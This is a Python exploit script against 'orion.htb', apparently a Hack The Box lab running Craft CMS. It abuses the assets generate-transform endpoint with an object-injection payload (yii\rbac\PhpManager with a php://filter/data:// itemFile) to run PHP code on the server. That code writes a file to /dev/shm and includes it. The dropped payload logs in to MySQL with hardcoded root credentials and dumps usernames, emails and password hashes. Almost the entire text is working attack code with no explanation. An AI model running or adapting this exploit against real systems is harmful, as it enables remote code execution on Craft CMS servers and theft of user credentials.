import requests, re, base64, time, sys

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    item_file = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/dashboard')
    csrf = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    csrf_token = csrf.group(1) if csrf else ''
    payload = {"assetId": 11, "handle": {"width": 1, "height": 1, "as session": {"class": "craft\\behaviors\\FieldLayoutBehavior", "__class": "yii\\rbac\\PhpManager", "__construct()": [{"itemFile": item_file}]}}
    headers = {'Content-Type': 'application/json', 'X-CSRF-Token': csrf_token}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=payload, headers=headers, timeout=15)

# The PHP payload to write to /dev/shm/bp.php
# It flushes all buffers, outputs data, then crashes
php_code_for_file = (
    '<?php '
    'while (ob_get_level() > 0) { ob_end_flush(); } '
    'echo str_repeat("X", 8192); '
    'try { '
    '$db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!", [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]); '
    '$r = $db->query("SELECT id,username,email,password FROM users LIMIT 5")->fetchAll(PDO::FETCH_ASSOC); '
    'echo "USER_DATA:" . json_encode($r); '
    '} catch (Exception $e) { echo "DB_ERR:" . $e->getMessage(); } '
    '$arr = []; echo $arr[999]; ?>'
)

# Base64 for writing via file_put_contents
php_b64 = base64.b64encode(php_code_for_file.encode()).decode()
write_php = '<?php file_put_contents("/dev/shm/bp.php", base64_decode("' + php_b64 + '")); ?>'

print("[*] Step 1: Writing bp.php to /dev/shm/ ...")
r = inject_b64(write_php)
print(f"    Status: {r.status_code}, Len: {len(r.text)}")
time.sleep(1)

print("[*] Step 2: Including /dev/shm/bp.php via exploit ...")
s = requests.Session()
r = s.get(f'{HOST}/index.php?p=admin/dashboard')
csrf = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
csrf_token = csrf.group(1) if csrf else ''

payload = {
    "assetId": 11,
    "handle": {
        "width": 1,
        "height": 1,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "yii\\rbac\\PhpManager",
            "__construct()": [{"itemFile": "/dev/shm/bp.php"}]
        }
    }
}
headers = {'Content-Type': 'application/json', 'X-CSRF-Token': csrf_token}
r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=payload, headers=headers, timeout=30)

print(f"    Status: {r2.status_code}")
print(f"    Content length: {len(r2.text)}")

# Check for our data
text = r2.text
if 'USER_DATA' in text:
    idx = text.index('USER_DATA')
    print(f'[+] SUCCESS! USER_DATA found at byte {idx}')
    print(text[idx:idx+1000])
elif 'DB_ERR' in text:
    idx = text.index('DB_ERR')
    print(f'[!] DB_ERR found at byte {idx}')
    print(text[idx:idx+1000])
elif 'XXXXXX' in text:
    idx = text.index('XXXXXX')
    print(f'[+] X markers found at byte {idx}')
    print(f'    Context: {text[max(0,idx-20):idx+200]}')
else:
    print('[-] No markers found. Analyzing response...')
    first_200 = text[:200]
    last_500 = text[-500:]
    print(f'    First 200: {first_200}')
    print(f'    Last 500: {last_500}')
